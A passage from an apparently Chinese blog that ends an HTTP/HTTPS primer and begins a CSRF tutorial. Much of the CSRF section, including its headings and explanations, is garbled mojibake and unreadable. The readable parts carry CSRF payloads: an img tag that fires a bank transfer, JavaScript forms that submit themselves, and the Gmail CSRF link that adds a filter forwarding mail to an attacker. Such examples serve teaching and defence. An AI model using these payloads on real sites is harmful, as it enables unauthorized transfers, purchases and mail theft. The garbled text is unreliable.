-<p>HTTP 的 URL 是由 http:&#x2F;&#x2F; 起始与默认使用端口 <strong>80</strong>，而 HTTPS 的 URL 则是由 https:&#x2F;&#x2F; 起始与默认使用端口<strong>443</strong>。</p>
-<p><img src="/.com//image-20250520030430-xrcqvnk.png" alt="image"></p>
-<h2 id="HTTP-工作原理"><a href="#HTTP-工作原理" class="headerlink" title="HTTP 工作原理"></a>HTTP 工作原理</h2><p>HTTP 协议工作于客户端-服务端架构上。</p>
-<p>HTTP 工作过程通常如下：</p>
-<ol>
-<li><strong>客户端发起请求</strong>：用户通过客户端（如浏览器）输入 URL，客户端向服务器发起一个 <strong>HTTP 请求</strong>。</li>
-<li><strong>服务器处理请求</strong>：服务器接收到请求后，根据<strong>请求的类型</strong>（如GET、POST等）和<strong>请求的资源</strong>，进行相应的处理。</li>
-<li><strong>服务器返回响应</strong>：服务器将<strong>处理结果</strong>包装成<strong>HTTP响应</strong>消息，发送回客户端。</li>
-<li><strong>客户端渲染页面</strong>：客户端接收到响应后，根据响应内容（如HTML、图片等）渲染页面，展示给用户。</li>
-</ol>
-<p>Web 服务器有：Nginx 服务器，Apache 服务器，IIS 服务器（Internet Information Services）等。</p>
-<p>HTTP 默认端口号为 80，但是你也可以改为 8080 或者其他端口。</p>
-<p><strong>HTTP 三点注意事项：</strong></p>
-<ul>
-<li>HTTP 是无连接：无连接的含义是<strong>限制每次连接</strong>只<strong>处理一个请求</strong>，服务器<strong>处理完客户的请求</strong>，并<strong>收到客户的应答</strong>后，即<strong>断开连接</strong>，采用这种方式可以<strong>节省传输时间</strong>。</li>
-<li>HTTP 是<strong>媒体独立</strong>的：这意味着，只要<strong>客户端和服务器</strong>知道<strong>如何处理的数据内容</strong>，任何类型的数据都可以<strong>通过HTTP发送</strong>，客户端以及服务器指定使用<strong>适合的 MIME-type</strong> 内容类型。</li>
-<li>HTTP 是<strong>无状态</strong>：HTTP 协议是<strong>无状态协议</strong>，无状态是指协议对于事务处理<strong>没有记忆能力</strong>，缺少状态意味着如果后续处理需要前面的信息，则它<strong>必须重传</strong>，这样可能导致每次连接传送的数据量增大，另一方面，在服务器不需要先前信息时它的应答就较快。</li>
-</ul>
-<p>以下图表展示了 HTTP 协议通信流程：</p>
-<p><img src="/.com//image-20250520030441-6ak4ho7.png" alt="image"></p>
-<hr>
-<h2 id="HTTPS-作用"><a href="#HTTPS-作用" class="headerlink" title="HTTPS 作用"></a>HTTPS 作用</h2><p>HTTPS 的主要作用是在不安全的网络上创建一个<strong>安全信道</strong>，并可在使用<strong>适当的加密包</strong>和<strong>服务器证书</strong>可被验证且可被信任时，对<strong>窃听和中间人攻击</strong>提供合理的防护。</p>
-<p>HTTPS 的信任基于预先安装在操作系统中的<strong>证书颁发机构（CA）</strong> 。</p>
-<p>因此，与一个网站之间的 HTTPS 连线仅在这些情况下可被信任：</p>
-<ul>
-<li>浏览器正确地实现了 HTTPS 且操作系统中安装了正确且受信任的证书颁发机构；</li>
-<li>证书颁发机构仅信任合法的网站；</li>
-<li>被访问的网站提供了一个有效的证书，也就是说它是一个由操作系统信任的证书颁发机构签发的（大部分浏览器会对无效的证书发出警告）；</li>
-<li>该证书正确地验证了被访问的网站（例如，访问 <a target="_blank" rel="noopener" href="https://www.runoob.com/">https://www.runoob.com</a> 时收到了签发给 <a target="_blank" rel="noopener" href="http://www.runoob.com/">www.runoob.com</a> 而不是其它域名的证书）；</li>
-<li>此协议的加密层（SSL&#x2F;TLS）能够有效地提供认证和高强度的加密。</li>
-</ul>
-<p>Google Chrome、Internet Explorer 和 Firefox 等浏览器在网站含有由加密和未加密内容组成的混合内容时，会发出警告。</p>
-<p>HTTP 链接显示不安全：</p>
-<p><img src="/.com//image-20250520030456-1rj8505.png" alt="image"></p>
-<p>HTTPS 链接显示为安全：</p>
-<p><img src="/.com//image-20250520030504-od4iq6y.png" alt="image"></p>
-<hr>
-<h2 id="HTTP-与-HTTPS-区别"><a href="#HTTP-与-HTTPS-区别" class="headerlink" title="HTTP 与 HTTPS 区别"></a>HTTP 与 HTTPS 区别</h2><p>虽然 HTTP 和 HTTPS 在名称上非常相似，但它们在安全性上有本质的区别：HTTPS通过使用SSL&#x2F;TLS协议，为数据传输<strong>提供了加密和完整性校验</strong>，从而<strong>保护了用户的隐私和数据安全</strong>。随着网络安全意识的提高，越来越多的网站开始使用HTTPS来保护用户数据。</p>
-<p><img src="/.com//image-20250520030518-m0ig9z5.png" alt="image"></p>
-<p>同时，主流的浏览器和搜索引擎也在鼓励网站使用 HTTPS。</p>
-<p>因此，对于涉及敏感信息传输的网站，建议使用 HTTPS 来提高安全性。</p>
-<p>主要区别如下：</p>
-<ul>
-<li><p><strong>加密</strong>：</p>
-<ul>
-<li><strong>HTTP</strong>：数据传输过程中不加密，<strong>容易被截获和篡改</strong>。</li>
-<li><strong>HTTPS</strong>：使用<strong>SSL&#x2F;TLS协议</strong>对传输的<strong>数据进行加密</strong>，保护<strong>数据传输过程中的安全性</strong>。</li>
-</ul>
-</li>
-<li><p><strong>端口</strong>：</p>
-<ul>
-<li><strong>HTTP</strong>：默认使用端口80。</li>
-<li><strong>HTTPS</strong>：默认使用端口443。</li>
-</ul>
-</li>
-<li><p><strong>安全性</strong>：</p>
-<ul>
-<li><strong>HTTP</strong>：不提供数据加密，安全性较低。</li>
-<li><strong>HTTPS</strong>：提供数据加密和完整性校验，安全性较高。</li>
-</ul>
-</li>
-<li><p><strong>证书</strong>：</p>
-<ul>
-<li><strong>HTTP</strong>：不需要证书。</li>
-<li><strong>HTTPS</strong>：需要<strong>SSL证书</strong>来启用加密，并验证服务器的身份。</li>
-</ul>
-</li>
-<li><p><strong>性能</strong>：</p>
-<ul>
-<li><strong>HTTP</strong>：由于<strong>不加密数据</strong>，性能略高于HTTPS。</li>
-<li><strong>HTTPS</strong>：由于需要进行<strong>加密和解密</strong>，可能会有一定的性能开销。</li>
-</ul>
-</li>
-<li><p><strong>搜索引擎优化(SEO)</strong> ：</p>
-<ul>
-<li><strong>HTTP</strong>：搜索引擎可能会对<strong>没有使用HTTPS的网站进行降权</strong>。</li>
-<li><strong>HTTPS</strong>：搜索引擎倾向于优先索引和展示使用HTTPS的网站。</li>
-</ul>
-</li>
-<li><p><strong>浏览器显示</strong>：</p>
-<ul>
-<li><strong>HTTP</strong>：在大多数现代浏览器中，HTTP网站通常显示为 <strong>“不安全”</strong> 。</li>
-<li><strong>HTTPS</strong>：浏览器会显示一个锁形图标，表示网站是安全的。</li>
-</ul>
-</li>
-<li><p><strong>成本</strong>：</p>
-<ul>
-<li><strong>HTTP</strong>：通常免费。</li>
-<li><strong>HTTPS</strong>：需要购买SSL证书，可能会有一定的成本。</li>
-</ul>
-</li>
-<li><p><strong>应用场景</strong>：</p>
-<ul>
-<li><strong>HTTP</strong>：适用于<strong>不需要传输敏感信息</strong>的网站，如新闻网站、博客等。</li>
-<li><strong>HTTPS</strong>：适用于<strong>需要传输敏感信息</strong>的网站，如网上银行、在线购物、电子邮件等。</li>
-</ul>
-</li>
-</ul>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/05/20/Web/HTTP%E6%95%99%E7%A8%8B/" data-id="cmaxygi0b0000oc7k1l578axb" data-title="HTTP/HTTPS 简介" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HTTPS/" rel="tag">HTTPS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" rel="tag">网络协议</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/CSRF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/05/20/Web/CSRF/" class="article-date">
-  <time class="dt-published" datetime="2024-05-19T16:00:00.000Z" itemprop="datePublished">2024-05-20</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/05/20/Web/CSRF/">CSRF</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="一、什么是CSRF"><a href="#一、什么是CSRF" class="headerlink" title="一、什么是CSRF?"></a>一、什么是CSRF?</h2><blockquote>
-<p>CSRF (Cross-site request forgery跨站请求伪造)也称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。</p>
-<p>简单的说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作（如转账和购买商品））。因为浏览器曾经认证过，所以被访问的站点会觉得这是真正的用户操作而去运行。</p>
-</blockquote>
-<h2 id="浜屻€乕CSRF鏀诲嚮-https-so-csdn-net-so-search-q-CSRF-E6-94-BB-E5-87-BB-spm-1001-2101-3001-7020-鍘熺悊鍙婅繃绋"><a href="#浜屻€乕CSRF鏀诲嚮-https-so-csdn-net-so-search-q-CSRF-E6-94-BB-E5-87-BB-spm-1001-2101-3001-7020-鍘熺悊鍙婅繃绋" class="headerlink" title="浜屻€乕CSRF鏀诲嚮](https://so.csdn.net/so/search?q=CSRF%E6%94%BB%E5%87%BB&amp;spm=1001.2101.3001.7020)鍘熺悊鍙婅繃绋"></a>浜屻€乕CSRF鏀诲嚮](<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=CSRF%E6%94%BB%E5%87%BB&spm=1001.2101.3001.7020)%E9%8D%98%E7%86%BA%E6%82%8A%E9%8D%99%E5%A9%85%E7%B9%83%E7%BB%8B">https://so.csdn.net/so/search?q=CSRF%E6%94%BB%E5%87%BB&amp;spm=1001.2101.3001.7020)鍘熺悊鍙婅繃绋</a></h2><blockquote>
-<p>CSRF涓轰粈涔堣兘澶熸敾鍑绘垚鍔?</p>
-<p>鍏舵湰璐ㄥ師鍥犳槸閲嶈鎿嶄綔鐨勬墍鏈夊弬鏁伴兘鏄彲浠ヨ鏀诲嚮鑰呯寽娴嬪埌鐨勩€</p>
-<p>鏀诲嚮鑰呭彧鏈夐娴嬪嚭URL鐨勬墍鏈夊弬鏁颁笌鍙傛暟鍊硷紝鎵嶈兘鎴愬姛鍦版瀯閫犱竴涓吉閫犵殑璇锋眰;鍙嶄箣锛屾敾鍑昏€呭皢鏃犳硶鏀诲嚮鎴愬姛銆</p>
-</blockquote>
-<p><img src="/.com//image-20250520024626-zm1u5u8.png" alt="image"></p>
-<p>浠庝笂鍥捐兘澶熺湅鍑猴紝瑕佸畬姣曚竴娆SRF鏀诲嚮锛屽彈瀹宠€呭繀椤讳緷娆″畬姣曚袱涓楠わ細</p>
-<blockquote>
-<pre><code>    鐧诲綍鍙椾俊浠荤珯鐐笰锛屽苟鍦ㄦ湰鍦扮敓鎴怌ookie銆�
-
-    鍦ㄤ笉鐧诲嚭A鐨勬儏鍐典笅锛岃闂嵄鎬ョ珯鐐笲銆�
-</code></pre>
-</blockquote>
-<p><img src="/.com//image-20250520024642-rrrnihd.png" alt="image"></p>
-<blockquote>
-<p>1銆佸鎴风閫氳繃璐︽埛瀵嗙爜鐧诲綍璁块棶缃戠珯A銆�<br>2銆佺綉绔橝楠岃瘉瀹㈡埛绔橝鐢熸垚涓€涓猻essionlD锛屽苟杩斿洖缁欏鎴风瀛樺偍鍦ㄦ祻瑙堝櫒涓€<br>2銆佺綉绔橝楠岃瘉瀹㈡埛绔殑璐﹀彿瀵嗙爜锛屾垚鍔熷垯鐢熸垚涓€涓猻essionlD锛屽苟杩斿洖缁欏鎴风瀛樺偍鍦ㄦ祻瑙堝櫒涓€�<br>3銆佽瀹㈡埛绔疶ab鈥斾釜鏂伴〉闈㈣闂簡缃戠珯B銆�<br>4銆佺綉绔橞鑷姩瑙﹀彂瑕佹眰璇ュ鎴风璁块棶缃戠珯A銆�(鍗冲湪缃戠珯B涓湁閾炬帴鎸囧悜缃戠珯A)<br>5銆佸鎴风閫氳繃缃戠珯B涓殑閾炬帴璁块棶缃戠珯A銆�(姝ゆ椂鎼哄甫鏈夊悎娉曠殑SessionID杩涜璁块棶绔橝鐨�)<br>6銆佹鏃剁綉绔橝鍙渶妫€楠宻essionIlD鏄惁鍚堟硶锛屽悎娉曞垯鎵ц鐩稿簲鐨勬搷浣溿€�(鍥犳鍏蜂綋鍟ュ伐鍏峰氨寰楃湅閾炬帴锛屼互鍙婄綉绔橞瑕佹眰璁块棶鏃舵惡甯︾殑鏁版嵁)</p>
-</blockquote>
-<p>鎵€浠ヨ琚獵SRF鏀诲嚮锛屽繀椤诲悓鏃舵弧瓒充袱涓潯浠讹細</p>
-<p>鐧诲綍鍙椾俊浠荤綉绔橝锛屽苟鍦ㄦ湰鍦扮敓鎴怌ookie銆� 鍦ㄤ笉鐧诲嚭A鐨勬儏鍐典笅锛岃闂嵄闄╃綉绔橞銆�</p>
-<hr>
-<h2 id="涓夈€丆SRF鍒嗙被"><a href="#涓夈€丆SRF鍒嗙被" class="headerlink" title="涓夈€丆SRF鍒嗙被"></a>涓夈€丆SRF鍒嗙被</h2><p>CSRF(Cross-Site Request Forgery)锛岃窡XSS婕忔礊鏀诲嚮涓€鏍凤紝瀛樺湪宸ㄥぇ鐨勫嵄瀹虫€с€�</p>
-<p>浣犲彲浠ヨ繖涔堟潵鐞嗚В:鏀诲嚮鑰呯洍鐢ㄤ簡浣犵殑韬唤锛屼互浣犵殑鍚嶄箟鍙戦€佹伓鎰忚姹傦紝瀵规湇鍔″櫒鏉ヨ杩欎釜璇锋眰鏄畬鍏ㄥ悎娉曠殑锛屼絾鏄嵈瀹屾垚浜嗘敾鍑昏€呮墍鏈熸湜鐨勪竴涓搷浣滐紝姣斿浠ヤ綘鐨勫悕涔夊彂閫侀偖浠躲€佸彂娑堟伅锛岀洍鍙栦綘鐨勮处鍙凤紝娣诲姞绯荤粺绠＄悊鍛橈紝鐢氳嚦浜庤喘涔板晢鍝併€佽櫄鎷熻揣甯佽浆璐︾瓑</p>
-<h3 id="1-GET绫诲瀷鐨凜SRF"><a href="#1-GET绫诲瀷鐨凜SRF" class="headerlink" title="1. GET绫诲瀷鐨凜SRF"></a>1. GET绫诲瀷鐨凜SRF</h3><p>1.GET绫诲瀷鐨凜SRF</p>
-<p>浠呬粎椤昏涓€涓狧TTP璇锋眰銆傚氨鑳藉鏋勯€犱竴娆＄畝鍗曠殑CSRF銆�</p>
-<p>鏍蜂緥锛�</p>
-<p>閾惰绔欑偣A锛氬畠浠ET璇锋眰鏉ュ畬姣曢摱琛岃浆璐︾殑鎿嶄綔锛屽锛�</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000 </span><br></pre></td></tr></table></figure>
-
-<p>鍗遍櫓绔欑偣B锛氬畠閲岄潰鏈変竴娈礖TML鐨勪唬鐮佷緥濡備互涓嬶細</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="attr">http</span>:<span class="comment">//www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>棣栧厛銆備綘鐧诲綍浜嗛摱琛岀珯鐐笰锛岀劧鍚庤闂嵄闄╃珯鐐笲锛屽櫌锛岃繖鏃朵綘浼氬彂鐜颁綘鐨勯摱琛岃处鎴峰皯浜�1000鍧椼€�</p>
-<p>涓轰粈涔堜細杩欐牱鍛紵鍘熷洜鏄摱琛岀珯鐐笰杩濆弽浜咹TTP瑙勮寖锛屼娇鐢℅ET璇锋眰鏇存柊璧勬簮銆�</p>
-<p>鍦ㄨ闂嵄闄╃珯鐐笲鐨勪箣鍓嶃€備綘宸茬粡鐧诲綍浜嗛摱琛岀珯鐐笰锛岃€孊涓殑 涓€涓悎娉曠殑璇锋眰锛屼絾杩欓噷琚笉娉曞垎瀛愬埄鐢ㄤ簡锛夈€�</p>
-<p>鎵€浠ヤ綘鐨勬祻瑙堝櫒浼氬甫涓婁綘鐨勯摱琛岀珯鐐笰鐨凜ookie鍙戝嚭Get璇锋眰锛屽幓鑾峰彇璧勬簮浠ET鐨勬柟寮忚姹傜涓夋柟璧勬簮锛堣繖閲岀殑绗笁鏂瑰氨鏄寚閾惰绔欑偣浜嗭級锛�</p>
-<p>鍘熸湰杩欐槸锛�</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</span></span><br></pre></td></tr></table></figure>
-
-<p>缁撴灉閾惰绔欑偣鏈嶅姟鍣ㄦ敹鍒拌姹傚悗锛岃寰楄繖鏄竴涓洿鏂拌祫婧愭搷浣滐紙杞处鎿嶄綔锛夛紝鎵€浠ュ氨绔嬮┈杩涜杞处鎿嶄綔銆�</p>
-<h3 id="2-POST绫诲瀷鐨凜SRF"><a href="#2-POST绫诲瀷鐨凜SRF" class="headerlink" title="2. POST绫诲瀷鐨凜SRF"></a>2. POST绫诲瀷鐨凜SRF</h3><p>鍦–SRF鏀诲嚮娴佽涔嬪垵锛屾浘缁忔湁涓€绉嶉敊璇殑瑙傜偣锛岃涓篊SRF鏀诲嚮鍙兘鐢盙ET璇锋眰鍙戣捣銆傚洜姝ゅ緢澶氬紑鍙戣€呴兘璁や负鍙鎶婇噸瑕佺殑鎿嶄綔鏀规垚鍙厑璁窹OST璇锋眰锛屽氨鑳介槻姝SRF鏀诲嚮銆�</p>
-<p>杩欐牱鐨勯敊璇鐐瑰舰鎴愮殑鍘熷洜涓昏鍦ㄤ簬锛屽ぇ澶氭暟CSRF鏀诲嚮鍙戣捣鏃讹紝浣跨敤鐨凥TML鏍囩閮芥槸<image>銆�<iframe>銆�<script>绛夊甫鈥渟rc&quot;灞炴€х殑鏍囩锛岃繖绫绘爣绛惧彧鑳藉鍙戣捣涓€娆ET璇锋眰锛岃€屼笉鑳藉彂璧稰OST璇锋眰銆�</p>
-<p>鑰屽浜庡緢澶氱綉绔欑殑搴旂敤鏉ヨ锛屼竴浜涢噸瑕佹搷浣滃苟鏈弗鏍煎湴鍖哄垎GET涓嶱OST锛屾敾鍑昏€呭彲浠ヤ娇鐢℅ET鏉ヨ姹傝〃鍗曠殑鎻愪氦鍦板潃銆傛瘮濡傚湪PHP涓紝濡傛灉浣跨敤鐨勬槸$_REQUEST锛岃€岄潪$_POST鑾峰彇鍙橀噺锛屽垯浼氬瓨鍦ㄨ繖涓棶棰樸€�</p>
-<p>瀵逛簬涓€涓〃鍗曟潵璇达紝鐢ㄦ埛寰€寰€涔熷氨鍙互浣跨敤GET鏂瑰紡鎻愪氦鍙傛暟銆傛瘮濡備互涓嬭〃鍗�:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot; / register&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;register&quot;</span> method=<span class="string">&quot;post&quot;</span> &gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=text name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;&quot;</span> /&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=password name=<span class="string">&quot;password&quot;</span> value=<span class="string">&quot;&quot;</span> /&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=submit name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
-
-<p>鐢ㄦ埛鍙皾璇曟瀯閫犱竴涓狦ET璇锋眰</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http: //host/register?username=<span class="built_in">test</span>&amp;password=passwd</span><br></pre></td></tr></table></figure>
-
-<p>鏉ユ彁浜わ紝鑻ユ湇鍔″櫒绔湭瀵硅姹傛柟娉曡繘琛岄檺鍒讹紝鍒欒繖涓姹備細閫氳繃銆�</p>
-<p>濡傛灉鏈嶅姟鍣ㄧ宸茬粡鍖哄垎浜咷ET涓嶱OST锛岄偅涔堟敾鍑昏€呮湁浠€涔堟柟娉曞憿?瀵逛簬鏀诲嚮鑰呮潵璇达紝鑻ュ共绉嶆柟娉曞彲浠ユ瀯閫犲嚭涓€涓狿OST璇锋眰銆�</p>
-<p>鏈€绠€鍗曠殑鏂规硶锛屽氨鏄湪涓€涓〉闈腑鏋勯€犲ソ涓€涓〃鍗曡〃鍗曪紝鐒跺悗浣跨敤JavaScript鑷姩鎻愪氦杩欎釜琛ㄥ崟銆傛瘮濡傦紝鏀诲嚮鑰呭湪<a target="_blank" rel="noopener" href="http://www.b.com/test.html%E6%B6%93%EE%85%A0%E7%B4%AA%E9%8D%90%E6%AC%8F%EE%9B%A7%E6%B6%93%E5%AC%A9%E5%94%AC%E9%90%AE%E4%BE%8A%E7%B4%B0">www.b.com/test.html涓紪鍐欏涓嬩唬鐮侊細</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;http: / / www . a.com/register&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;register&quot;</span> method=<span class="string">&quot;post&quot;</span> &gt;&lt;input <span class="built_in">type</span>=text name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;&quot;</span>/&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=password name=<span class="string">&quot;password&quot;</span> value=<span class="string">&quot;&quot;</span>/&gt;&lt;input <span class="built_in">type</span>=submit name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>/&gt;&lt;/ form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var f = document.getElementById ( <span class="string">&quot;register&quot;</span>);</span><br><span class="line">f.inputs [0].value = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">f.inputs [1].value = <span class="string">&quot;passwd&quot;</span> ;</span><br><span class="line">f.submit ();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>鏀诲嚮鑰呯敋鑷冲彲浠ュ皢杩欎釜椤甸潰闅愯棌鍦ㄤ竴涓笉鍙鐨刬frame绐楀彛涓紝閭ｄ箞鏁翠釜鑷姩鎻愪氦琛ㄥ崟鐨勮繃绋嬶紝瀵逛簬鐢ㄦ埛鏉ヨ涔熸槸涓嶅彲瑙佺殑銆�</p>
-<p>鍦�2007骞寸殑Gmail CSRF婕忔礊鏀诲嚮杩囩▼涓紝瀹夊叏鐮旂┒鑰卲dp灞曠ず浜嗚繖涓€鎶€宸с€傞鍏堬紝鐢ㄦ埛闇€瑕佺櫥褰旼mail璐︽埛锛屼互渚胯娴忚鍣ㄨ幏寰桮mail鐨勪复鏃禖ookie銆�</p>
-<p><img src="/assets/image-20250520025130-b7gdarh.png" alt="image"></p>
-<p>鐢ㄦ埛鐧诲綍Gmail</p>
-<p>鐒跺悗锛屾敾鍑昏€呰浣跨敤鎴疯闂竴涓伓鎰忛〉闈€€�</p>
-<p><img src="/assets/image-20250520025142-8swgbme.png" alt="image"></p>
-<p>鏀诲嚮鑰呰浣跨敤鎴疯闂伓鎰忛〉闈�</p>
-<p>鍦ㄨ繖涓伓鎰忛〉闈腑锛岄殣钘忎簡涓€涓猧frame锛宨frame鐨勫湴鍧€鎸囧悜pdp鍐欑殑CSRF鏋勯€犻〉闈€€�</p>
-<blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http: //www.gnucitizen.org/util/csrf?_method=POST&amp;_enctype=multipart/form-data&amp;_action=https%3A//mail.google.com/mail/h/ewtljmuj4ddv/%3Fv%3Dprf&amp;cf2_emc=<span class="literal">true</span>&amp;cf2_email=evilinboxmailinator.com&amp;cfl_from&amp;cfl_toucf1_subjicf1_has&amp;cfl_hasnotscf1_attach=truestfi&amp;S=z&amp;irf=on&amp;nvp bu_cftb=Create%20Filter</span><br></pre></td></tr></table></figure></blockquote>
-<p>杩欎釜閾炬帴鐨勫疄闄呬綔鐢ㄥ氨鏄妸鍙傛暟鐢熸垚涓€涓狿OST鐨勮〃鍗曪紝骞惰嚜鍔ㄦ彁浜ゃ€�<br>鐢变簬娴忚鍣ㄤ腑宸茬粡瀛樺湪Gmail鐨勪复鏃禖ookie锛屾墍浠ョ敤鎴峰湪iframe涓Gmail鍙戣捣鐨勮繖娆¤姹備細鎴愬姛鈥曗€旈偖绠辩殑Filter涓細鏂板垱寤轰竴鏉¤鍒欙紝灏嗘墍鏈夊甫闄勪欢鐨勯偖浠堕兘杞彂鍒版敾鍑昏€呯殑閭涓€�</p>
-<p><img src="/assets/image-20250520025208-tr38ddf.png" alt="image"></p>
-<p>鎭舵剰绔欑偣閫氳繃CSRF鍦ㄧ敤鎴风殑Gmail涓缓绔嬩竴鏉¤鍒欍€�</p>
-<p>濡傛灉涓婅堪渚嬪瓙鐪嬪緱杩樻槸鏈夌偣鎳甸€硷紝閭ｅ啀涓句竴涓緥瀛愶細</p>
-<p>鍦ㄦ櫘閫氱敤鎴风殑鐪间腑锛岀偣鍑荤綉椤�-&gt;鎵撳紑璇曠湅瑙嗛-&gt;璐拱瑙嗛鏄竴涓緢姝ｅ父鐨勪竴涓祦绋嬨€傚彲鏄湪鏀诲嚮鑰呯殑鐪间腑鍙互绠楁甯镐絾鍙堜笉姝ｅ父鐨勶紝褰撶劧涓嶆甯哥殑鎯呭喌涓嬶紝鏄湪寮€鍙戣€呭畨鍏ㄦ剰璇嗕笉瓒虫墍閫犳垚鐨勩€傛敾鍑昏€呭湪璐拱澶勬姄鍒拌喘涔版椂鍊欑綉绔欏鐞嗚喘涔�(鎵ｉ櫎)鐢ㄦ埛浣欓鐨勫湴鍧€銆�</p>
-<p>姣斿:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/coures/user/handler666buy.php&lt;/font&gt;</span><br></pre></td></tr></table></figure>
-
-<p>閫氳繃鎻愪氦琛ㄥ崟锛宐uy.php澶勭悊璐拱鐨勪俊鎭紝杩欓噷鐨�666涓鸿棰慖D銆傞偅涔堟敾鍑昏€呯幇鍦ㄦ瀯閫犱竴涓摼鎺ワ紝閾炬帴涓寘鍚互涓嬪唴瀹广€�</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=/coures/user/handler/666/buy method=POST&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;xx&quot;</span> value=<span class="string">&quot;xx&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>褰撶敤鎴疯闂椤甸潰鍚庯紝琛ㄥ崟浼氳嚜鍔ㄦ彁浜わ紝鐩稿綋浜庢ā鎷熺敤鎴峰畬鎴愪簡涓€娆OST鎿嶄綔锛岃嚜鍔ㄨ喘涔颁簡id涓�666鐨勮棰戯紝浠庤€屽鑷村彈瀹宠€呬綑棰濇墸闄ゃ€�</p>
-<hr>
-<h2 id="鍥涖€丆SRF婕忔礊鐨勬寲鎺�"><a href="#鍥涖€丆SRF婕忔礊鐨勬寲鎺�" class="headerlink" title="鍥涖€丆SRF婕忔礊鐨勬寲鎺�"></a>鍥涖€丆SRF婕忔礊鐨勬寲鎺�</h2><p>1銆佹渶绠€鍗曠殑鏂规硶灏辨槸鎶撳彇涓€涓甯歌姹傜殑鏁版嵁鍖咃紝濡傛灉娌℃湁Referer瀛楁鍜宼oken锛岄偅涔堟瀬鏈夊彲鑳藉瓨鍦–SRF婕忔礊銆�</p>
-<p>2銆佸鏋滄湁Referer瀛楁锛屼絾鏄幓鎺塕eferer瀛楁鍚庡啀閲嶆柊鎻愪氦锛屽鏋滆鎻愪氦杩樻湁鏁堬紝閭ｄ箞鍩烘湰涓婂彲浠ョ‘瀹氬瓨鍦–SRF婕忔礊銆�</p>
